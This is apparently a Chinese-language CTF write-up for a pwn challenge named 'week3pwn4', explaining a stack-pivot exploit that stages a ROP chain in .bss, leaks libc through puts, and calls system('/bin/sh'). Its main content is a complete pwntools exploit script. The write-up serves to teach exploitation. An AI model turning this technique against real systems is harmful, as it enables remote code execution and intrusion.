# week3pwn4

## 题目简述

程序同样存在栈溢出，但可直接控制的区域不足以容纳完整泄漏链。利用内部的再次读取位置 `0x4011FD`，先把后续数据写到 `.bss`，再通过伪造 `rbp` 和 `leave; ret` 迁移执行。完成 libc 泄漏后重复这一过程，调用 `system('/bin/sh')`。

## 解题过程

第一条短 payload 把保存的 `rbp` 设为 `bss + 0x200`，返回到函数内部的读入逻辑，让第二条 payload 落到可写区。第二条数据的开头是 `puts(puts@got) -> main`，末尾放置下一次迁移所需的伪 `rbp` 与 `leave; ret`。泄露 libc 后，在 `bss + 0x800` 重复 staging，换成 `pop rdi; '/bin/sh'; system`。

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
HOST = 'challenge-host'
PORT = 8004
s = remote(HOST, PORT)
libc = ELF('./libc-2.31.so')
elf = ELF('./pwn4')
bss_addr = elf.bss()
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
main_read = 0x4011FD
pop_rdi_ret = 0x0000000000401283
leave_ret = 0x000000000040121d
ret = 0x000000000040101a

payload = b'a' * 0x50 + p64(bss_addr + 0x200) + p64(main_read)
s.sendafter(b'do you know stack pivoting?\n', payload)

payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload += b'a' * 0x30
payload += p64(bss_addr + 0x200 - 0x50 - 0x8)
payload += p64(leave_ret)
s.send(payload)

libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
success('libc_base=>' + hex(libc_base))
binsh = libc_base + libc.search(b'/bin/sh').__next__()

payload = b'a' * 0x50 + p64(bss_addr + 0x800) + p64(main_read)
s.sendafter(b'do you know stack pivoting?\n', payload)
payload = p64(pop_rdi_ret) + p64(binsh)
payload += p64(libc_base + libc.sym['system'])
payload = payload.ljust(0x50, b'\x00')
payload += p64(bss_addr + 0x800 - 0x50 - 0x8) + p64(leave_ret)
s.send(payload)
s.interactive()
```

## 方法总结

pwn4 的重点不是普通 ret2libc，而是利用函数中段再次读入来布置长链。需要同时跟踪三个位置：当前真实栈、作为 staging 区的 `.bss`、以及 `leave` 将要读取的伪栈。第一轮返回 `main` 是为了重新触发输入路径；第二轮才建立 Shell。硬编码地址来自无 PIE 的题目二进制，libc 内地址则必须由本次泄漏动态计算。
